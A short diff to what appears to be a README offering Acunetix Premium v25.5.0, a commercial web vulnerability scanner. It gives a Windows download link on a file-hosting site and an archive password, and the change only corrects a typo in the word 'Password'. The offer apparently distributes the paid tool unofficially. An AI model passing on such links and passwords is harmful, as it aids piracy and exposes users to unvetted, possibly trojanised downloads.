@@ -2,7 +2,7 @@
 
 Download Windows: https://krakenfiles.com/view/ubRYVeK2n5/file.html
 
-Passwword: acunetix
+Password: acunetix
 
 
 Acunetix Premium - v25.5.0
